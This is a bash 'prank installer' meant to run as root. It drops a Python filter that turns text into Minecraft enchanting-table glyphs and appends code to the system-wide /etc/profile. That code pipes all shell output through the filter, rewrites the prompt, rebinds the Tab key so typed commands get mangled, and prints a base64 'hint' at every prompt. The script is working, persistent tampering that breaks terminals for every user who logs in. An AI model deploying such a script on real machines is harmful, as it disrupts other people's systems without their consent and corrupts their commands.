#!/bin/bash
# Minecraft Enchanting Table prank installer
# Run this as root

set -e

FILTER_PATH="/usr/local/bin/galactic.py"
PROFILE="/etc/profile"
BACKUP="/etc/profile.bak.$(date +%s)"
echo "[*] Installing galactic prank..."
cat > "$FILTER_PATH" <<'EOF'
#!/usr/bin/env python3
import sys
sga = {
    "a":"ᔑ","b":"ʖ","c":"ᓵ","d":"↸","e":"ᒷ","f":"⎓","g":"⊣","h":"⍑",
    "i":"╎","j":"⋮","k":"ꖌ","l":"ꖎ","m":"ᒲ","n":"リ","o":"𝙹","p":"!¡",
    "q":"ᑑ","r":"∷","s":"ᓭ","t":"ℸ̣","u":"⚍","v":"⍊","w":"∴","x":"̇/",
    "y":"||","z":"⨅"
}
def convert(txt):
    return "".join(sga.get(ch.lower(), ch) for ch in txt)
if __name__ == "__main__":
    for line in sys.stdin:
        sys.stdout.write(convert(line))
EOF
chmod +x "$FILTER_PATH"
echo "[+] Installed galactic filter at $FILTER_PATH"
cp "$PROFILE" "$BACKUP"
echo "[+] Backed up $PROFILE to $BACKUP"
if ! grep -q "galactic.py" "$PROFILE"; then
    cat >> "$PROFILE" <<'EOF'
if [ -x /usr/local/bin/galactic.py ]; then
    # Translate ALL output (stdout + stderr)
    exec > >( /usr/local/bin/galactic.py )
    exec 2>&1
    export PS1="$(echo '\u@\h \W $ ' | /usr/local/bin/galactic.py)"
    bind -x '"\C-i": "READLINE_LINE=$(echo $READLINE_LINE | /usr/local/bin/galactic.py)"'
    export PROMPT_COMMAND='echo "ZmZmYmY5YmRhODY4ZmVkMTI0YzA0ZWMwMjQ0NDczNmY4ZjVmNmFlOA==" | /usr/local/bin/galactic.py'
fi
EOF
    echo "[+] Prank injected into $PROFILE"
else
    echo "[!] Prank already present in $PROFILE"
fi
echo "[*] Done! Next login (SSH or TTY) will show enchanted output, hints, and input prank."
